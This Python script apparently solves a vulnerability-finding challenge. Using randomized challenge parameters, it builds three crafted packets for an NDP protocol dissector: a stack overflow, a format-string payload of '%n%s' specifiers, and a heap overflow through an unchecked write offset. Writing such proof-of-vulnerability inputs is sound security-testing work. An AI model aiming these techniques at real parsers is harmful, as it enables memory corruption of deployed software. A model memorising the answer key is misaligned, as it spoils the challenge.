#!/usr/bin/env python3
"""Generate proof-of-vulnerability binary inputs for the NDP dissector.

Reads per-instance challenge parameters from /app/.challenge.json to
construct PoVs that account for the actual randomized buffer sizes.
"""


import struct
import os
import json
import binascii


def crc32(data):
    """Standard CRC32 matching the C ndp_crc32 implementation."""
    return binascii.crc32(data) & 0xFFFFFFFF


def make_packet(pkt_type, flags, payload):
    """Construct a complete NDP packet with valid header and checksum."""
    checksum = crc32(payload)
    header = struct.pack('>IBBHI', 0x4E445001, pkt_type, flags,
                         len(payload), checksum)
    return header + payload


# Load per-instance challenge parameters
with open('/app/.challenge.json') as f:
    CHALLENGE = json.load(f)

IDENT_BUF = CHALLENGE['ident_name_buf']


def gen_pov1():
    """CWE-121: Stack buffer overflow in ident.c dissect_iface_name.

    The IDENT handler copies the interface name into a stack buffer of
    IDENT_NAME_BUF bytes without checking the input length.  We send a
    name much larger than the actual buffer, corrupting the stack canary.

    All bytes must be printable ASCII to pass validate_printable().
    """
    # Overflow by at least 200 bytes past the actual buffer size
    overflow_size = IDENT_BUF + 200
    name = b'A' * overflow_size
    ext_len = 6 + len(name)
    ext = struct.pack('>HBBH', 0x0002, 0x02, 0x00, ext_len) + name
    return make_packet(0x02, 0x00, ext)


def gen_pov2():
    """CWE-134: Format string vulnerability in auth.c process_auth_init.

    When NDP_FLAG_DEBUG is set, the username is passed directly as the
    format string to snprintf.  FORTIFY_SOURCE catches %n; %s dereferences
    garbage pointers from the stack.
    """
    username = b'%n%n%n%n%n%n%s%s%s%s%s%s%s%s%s%s'
    payload = struct.pack('B', 0x01)      # phase = AUTH_PHASE_INIT
    payload += struct.pack('>H', len(username))
    payload += username
    # flags = 0x01 (NDP_FLAG_DEBUG) to trigger the vulnerable code path
    return make_packet(0x03, 0x01, payload)


def gen_pov3():
    """CWE-787: Heap buffer overflow in bulk.c (OVERWRITE block).

    The BULK_OVERWRITE handler reads a write_offset from block data and
    copies to output + write_offset without bounds checking.  We use
    offset 0x40000000 (1 GB), far beyond any allocation.
    """
    num_blocks = 2

    data1 = b'B' * 16
    block1 = struct.pack('>HH', 0x0001, len(data1)) + data1

    write_offset = 0x40000000
    write_data = b'CCCC'
    block2_payload = struct.pack('>I', write_offset) + write_data
    block2 = struct.pack('>HH', 0x0002, len(block2_payload)) + block2_payload

    payload = struct.pack('>HH', num_blocks, 0) + block1 + block2
    return make_packet(0x04, 0x00, payload)


if __name__ == '__main__':
    os.makedirs('/app/pov', exist_ok=True)

    povs = {
        'pov1.bin': gen_pov1(),
        'pov2.bin': gen_pov2(),
        'pov3.bin': gen_pov3(),
    }

    for name, data in sorted(povs.items()):
        path = os.path.join('/app/pov', name)
        with open(path, 'wb') as f:
            f.write(data)
        print('Generated %s (%d bytes)' % (path, len(data)))
